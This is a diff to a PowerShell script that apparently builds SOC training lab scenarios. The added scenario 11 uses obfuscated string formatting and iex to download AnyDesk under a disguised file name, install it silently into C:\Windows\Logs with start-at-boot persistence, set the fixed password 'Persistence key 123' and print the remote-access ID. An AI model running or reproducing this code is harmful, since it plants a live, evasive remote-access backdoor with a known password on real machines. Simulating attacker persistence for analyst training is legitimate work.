@@ -7,8 +7,8 @@ New-Item -ItemType Directory -Path $labRoot -Force | Out-Null
 $caseNumber = Get-Random -Minimum 100000 -Maximum 999999
 $scenario = ($caseNumber % 9) + 1
 
-$username=Read-Host -Prompt 'Input your name'
-$useremail=Read-Host -Prompt 'Input your email'
+$username = Read-Host -Prompt 'Input your name'
+$useremail = Read-Host -Prompt 'Input your email'
 Write-Host ""
 Write-Host "SOC LAB CASE ID: SOC-$caseNumber"
 Write-Host "Start time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
@@ -249,6 +249,24 @@ for /L %%I in (1,1,%COUNT%) do (
             "$Encoded"
         ) -Wait
 
+    }
+    11 { 
+        New-Item -Path "$labRoot\" -Name "MyUsersInfo" -ItemType Directory -Force | Out-Null
+        $PerstFile = "$labRoot\MyUsersInfo\Employess.cve.exe"
+        $payload = "{0}oke{1}est -Uri 'https://{6}wnlo{7}.{5}sk.com/{2}{4}.{3}' -OutFile '$labRoot\MyUsersInfo\Employess.cve.exe' -UseBasicParsing" -f "Inv", "-WebRequ", "Any", "exe", "Desk", "anyde", "do", "ad"
+        iex $payload
+        $install_payload = "Sta{0}-Proce{1} -F{2}{3} '{9}' -Argu{4}List '--inst{5} `"C:\Windows\Logs\An{10}sk`" --start-with-win --si{6}' -W{7}{8}" -f "rt", "ss", "ile", "Path", "ment", "all", "lent", "a", "it", $PerstFile , "yde"   
+        iex $install_payload 
+        $PerstProgram = "C:\Win{0}\Lo{1}\An{2}\Any{3}.exe" -f "dows", "gs", "ydesk", "Desk"
+        if (-not (Test-Path $PerstProgram)) {
+            Write-Host "Installation failed."
+            return
+        }
+        $PerstFilePass = "Pers{1} {0}{2}{3}" -f "is", "istance", " key ", "123"
+        $PerstFilePass | & $PerstProgram --set-password
+        $id_payload = "& '$PerstProgram' --ge{0}-{1}" -f "t", "id" 
+        $PerstID = iex $id_payload
+        Write-Host $PerstID
     }
 }
 
